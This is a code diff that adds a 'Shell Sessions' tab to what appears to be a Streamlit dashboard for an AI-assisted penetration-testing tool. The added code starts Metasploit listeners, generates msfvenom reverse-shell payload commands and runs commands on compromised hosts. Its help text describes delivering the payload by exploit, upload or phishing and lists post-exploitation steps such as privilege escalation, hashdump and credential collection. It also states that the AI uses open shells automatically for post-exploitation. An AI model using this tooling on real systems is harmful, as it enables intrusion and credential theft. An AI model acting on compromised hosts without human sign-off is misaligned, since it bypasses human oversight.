@@ -351,6 +351,88 @@ def get_all_vulnerabilities(source_tool: str = None, service: str = None, risk_l
     except Exception as e:
         logger.error(f"Failed to get global vulnerabilities: {e}")
     return []
+
+
+# ── Shell session API helpers ─────────────────────────────────────────────────
+
+def get_local_ip_suggestion() -> str:
+    try:
+        r = api_session.get(f"{API_BASE}/shells/local-ip", timeout=5)
+        if r.status_code == 200:
+            return r.json().get("local_ip", "")
+    except Exception:
+        pass
+    return ""
+
+
+def start_handler(session_id: str, lhost: str, lport: int, payload: str) -> Dict:
+    try:
+        r = api_session.post(
+            f"{API_BASE}/sessions/{session_id}/shells/handler",
+            json={"lhost": lhost, "lport": lport, "payload": payload},
+            timeout=15,
+        )
+        if r.status_code == 200:
+            return r.json()
+    except Exception as e:
+        logger.error(f"start_handler error: {e}")
+    return {}
+
+
+def stop_handler(session_id: str, handler_id: str) -> bool:
+    try:
+        r = api_session.delete(
+            f"{API_BASE}/sessions/{session_id}/shells/handler/{handler_id}", timeout=10
+        )
+        return r.status_code == 200
+    except Exception:
+        return False
+
+
+def get_handlers(session_id: str) -> list:
+    try:
+        r = api_session.get(f"{API_BASE}/sessions/{session_id}/shells/handlers", timeout=8)
+        if r.status_code == 200:
+            return r.json().get("handlers", [])
+    except Exception:
+        pass
+    return []
+
+
+def get_shell_sessions(session_id: str) -> list:
+    try:
+        r = api_session.get(f"{API_BASE}/sessions/{session_id}/shells", timeout=8)
+        if r.status_code == 200:
+            return r.json().get("sessions", [])
+    except Exception:
+        pass
+    return []
+
+
+def exec_shell_command(session_id: str, handler_id: str, msf_id: int, command: str) -> str:
+    try:
+        r = api_session.post(
+            f"{API_BASE}/sessions/{session_id}/shells/{handler_id}/{msf_id}/exec",
+            json={"command": command},
+            timeout=30,
+        )
+        if r.status_code == 200:
+            return r.json().get("output", "")
+    except Exception as e:
+        return f"[Error: {e}]"
+    return "[Request failed]"
+
+
+def get_shell_history(session_id: str, handler_id: str, msf_id: int) -> list:
+    try:
+        r = api_session.get(
+            f"{API_BASE}/sessions/{session_id}/shells/{handler_id}/{msf_id}/history",
+            timeout=8,
+        )
+        if r.status_code == 200:
+            return r.json().get("history", [])
+    except Exception:
+        pass
     return []
 
 
@@ -853,9 +935,12 @@ def display_session_details(session_details: Dict):
     pending_count = len(session_details.get("pending_commands", []))
     cmd_tab_label = f"⚡ Commands ({pending_count} pending)" if pending_count > 0 else "⚡ Commands"
 
-    tab1, tab2, tab3, tab4, tab5, tab6, tab7 = st.tabs(
+    _shell_count = len(get_shell_sessions(session_details.get("session_id", "")))
+    _shell_label = f"🐚 Shells ({_shell_count})" if _shell_count else "🐚 Shells"
+
+    tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs(
         ["📊 Overview", "🔍 Scan Results", "🛡️ Vulnerabilities", "🤖 AI Decisions",
-         cmd_tab_label, "📁 Evidence", "🔑 Credentials"]
+         cmd_tab_label, "📁 Evidence", "🔑 Credentials", _shell_label]
     )
 
     with tab1:
@@ -878,6 +963,9 @@ def display_session_details(session_details: Dict):
 
     with tab7:
         show_credentials(session_details)
+
+    with tab8:
+        show_shells(session_details)
 
 
 def show_session_overview(session_details: Dict):
@@ -2024,6 +2112,194 @@ def show_credentials(session_details: Dict):
                 <small>Captured: {cred.get('discovered_at','?')[:19]}</small>
             </div>
             """, unsafe_allow_html=True)
+
+
+def show_shells(session_details: Dict):
+    """Shell Sessions tab — manage multi/handler listeners and interact with
+    active meterpreter / reverse-shell sessions obtained during exploitation."""
+    session_id = session_details.get("session_id", "")
+
+    st.markdown("## 🐚 Shell Sessions")
+    st.caption(
+        "Start a Metasploit multi/handler to catch incoming shells. "
+        "Once a session connects, you can run commands directly from here. "
+        "The AI is also notified of active shells and will use them for post-exploitation."
+    )
+
+    # ── Section 1: Start / manage handlers ───────────────────────────────────
+    st.markdown("### 🎧 Listeners (multi/handler)")
+
+    with st.expander("➕ Start New Listener", expanded=True):
+        suggested_lhost = get_local_ip_suggestion()
+        with st.form("start_handler_form", clear_on_submit=False):
+            hc1, hc2 = st.columns([2, 1])
+            with hc1:
+                lhost = st.text_input("LHOST (your IP)", value=suggested_lhost,
+                                      placeholder="192.168.1.50")
+            with hc2:
+                lport = st.number_input("LPORT", value=4444, min_value=1, max_value=65535, step=1)
+
+            from core.shell_manager import COMMON_PAYLOADS
+            payload = st.selectbox("Payload", COMMON_PAYLOADS)
+
+            # Show matching msfvenom command for convenience
+            if lhost:
+                target_os = "windows" if "windows" in payload else "linux"
+                msfv_ext  = "exe" if target_os == "windows" else "elf"
+                st.code(
+                    f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
+                    f"-f {msfv_ext} -o /tmp/shell.{msfv_ext}",
+                    language="bash",
+                )
+
+            if st.form_submit_button("🚀 Start Listener", type="primary"):
+                if not lhost:
+                    st.error("Enter LHOST first.")
+                else:
+                    result = start_handler(session_id, lhost, int(lport), payload)
+                    if result.get("handler"):
+                        st.success(
+                            f"Handler started — listening on {lhost}:{lport} "
+                            f"({payload}). Waiting for connection…"
+                        )
+                        time.sleep(0.5)
+                        st.rerun()
+                    else:
+                        st.error("Failed to start handler. Check backend logs.")
+
+    # Active handlers
+    handlers = get_handlers(session_id)
+    if handlers:
+        for h in handlers:
+            s_count = h.get("session_count", 0)
+            status  = h.get("status", "unknown")
+            icon    = "🟢" if status == "listening" else "🔴" if status == "stopped" else "🟡"
+            with st.expander(
+                f"{icon} {h['lhost']}:{h['lport']} — {h['payload']} "
+                f"[{status}] · {s_count} session(s)",
+                expanded=(status == "listening"),
+            ):
+                st.markdown(f"**Handler ID:** `{h['handler_id']}`")
+                st.markdown(f"**Started:** {(h.get('started_at') or '')[:19]}")
+                if status not in ("stopped",):
+                    if st.button(f"⏹️ Stop Handler", key=f"stop_{h['handler_id']}",
+                                 use_container_width=True):
+                        stop_handler(session_id, h["handler_id"])
+                        time.sleep(0.3)
+                        st.rerun()
+    else:
+        st.info("No handlers running. Start one above to receive incoming connections.")
+
+    st.markdown("---")
+
+    # ── Section 2: Active shell sessions ─────────────────────────────────────
+    st.markdown("### 💻 Active Shell Sessions")
+
+    shells = get_shell_sessions(session_id)
+    if not shells:
+        st.info(
+            "No shell sessions yet. Once a target connects to your listener, "
+            "the session appears here automatically."
+        )
+    else:
+        for sh in shells:
+            _type = sh.get("type", "shell")
+            _icon = "🟣" if _type == "meterpreter" else "🟤"
+            _label = (
+                f"{_icon} {_type.title()} · Session {sh['msf_id']} · "
+                f"{sh.get('target_ip','?')} · {sh.get('status','?')}"
+            )
+            with st.expander(_label, expanded=True):
+                mc1, mc2, mc3 = st.columns(3)
+                mc1.metric("Type", _type.title())
+                mc2.metric("MSF Session ID", sh["msf_id"])
+                mc3.metric("Status", sh.get("status", "?").upper())
+
+                st.markdown(
+                    f"**Target:** `{sh.get('target_ip','?')}` &nbsp;|&nbsp; "
+                    f"**Opened:** {(sh.get('opened_at') or '')[:19]} &nbsp;|&nbsp; "
+                    f"**Last active:** {(sh.get('last_active') or '')[:19]}",
+                    unsafe_allow_html=True,
+                )
+
+                st.markdown("#### Run Command")
+
+                # Quick-action buttons for common post-exploitation commands
+                qa_cols = st.columns(4)
+                quick_cmds = [
+                    ("👤 whoami", "whoami"),
+                    ("🖥️ sysinfo", "sysinfo" if _type == "meterpreter" else "uname -a && id"),
+                    ("🌐 ipconfig", "ipconfig" if "windows" in sh.get("payload","") else "ip addr"),
+                    ("📋 ps", "ps" if _type == "meterpreter" else "ps aux | head -20"),
+                ]
+                for i, (label, cmd) in enumerate(quick_cmds):
+                    with qa_cols[i]:
+                        if st.button(label,
+                                     key=f"qa_{sh['shell_id']}_{i}",
+                                     use_container_width=True):
+                            st.session_state[f"shell_cmd_{sh['shell_id']}"] = cmd
+
+                # Command input
+                cmd_key   = f"shell_cmd_{sh['shell_id']}"
+                cmd_input = st.text_input(
+                    "Command",
+                    value=st.session_state.get(cmd_key, ""),
+                    key=f"cmd_input_{sh['shell_id']}",
+                    placeholder="whoami / sysinfo / getuid / hashdump / run post/multi/recon/local_exploit_suggester",
+                )
+
+                if st.button("▶️ Execute", key=f"exec_{sh['shell_id']}", type="primary"):
+                    if cmd_input.strip():
+                        with st.spinner("Running…"):
+                            out = exec_shell_command(
+                                session_id, sh["handler_id"], sh["msf_id"], cmd_input.strip()
+                            )
+                        st.markdown("**Output:**")
+                        st.code(out, language="text")
+                        st.session_state[cmd_key] = ""
+                        st.rerun()
+                    else:
+                        st.warning("Enter a command first.")
+
+                # Command history
+                history = get_shell_history(session_id, sh["handler_id"], sh["msf_id"])
+                if history:
+                    st.markdown("#### Command History")
+                    for entry in reversed(history[-10:]):
+                        with st.expander(
+                            f"$ {entry.get('command','')} "
+                            f"— {(entry.get('timestamp',''))[:19]}",
+                            expanded=False,
+                        ):
+                            st.code(entry.get("output", ""), language="text")
+
+    st.markdown("---")
+
+    # ── Section 3: Usage guidance ─────────────────────────────────────────────
+    with st.expander("📖 How to use shells", expanded=False):
+        st.markdown("""
+**Workflow:**
+
+1. **Start listener** — pick LHOST (your Kali IP), LPORT (e.g. 4444), and payload matching the target OS.
+2. **Copy the msfvenom command** shown above, generate the payload on your Kali machine, and deliver it to the target (via exploit, file upload, phishing, etc.).
+3. **Wait for connection** — when the target runs the payload, the session appears in "Active Shell Sessions" above.
+4. **Interact** — use quick-action buttons or type commands directly. For meterpreter use meterpreter commands (`sysinfo`, `getuid`, `hashdump`, `run post/...`). For plain shells use OS commands.
+
+**Useful meterpreter commands:**
+```
+sysinfo                              # OS info
+getuid                               # current user
+getsystem                            # try to escalate to SYSTEM
+hashdump                             # dump NTLM hashes (requires SYSTEM)
+run post/multi/recon/local_exploit_suggester   # privesc suggestions
+run post/windows/gather/credentials/credential_collector
+run post/windows/gather/enum_domain
+upload /tmp/winpeas.exe C:\\\\Temp\\\\winpeas.exe
+shell                                # drop to cmd.exe
+```
+
+**The AI knows about open shells** — once a session connects, the AI will use it automatically for post-exploitation commands in subsequent analysis cycles.
+        """)
 
 
 def show_threat_intel():
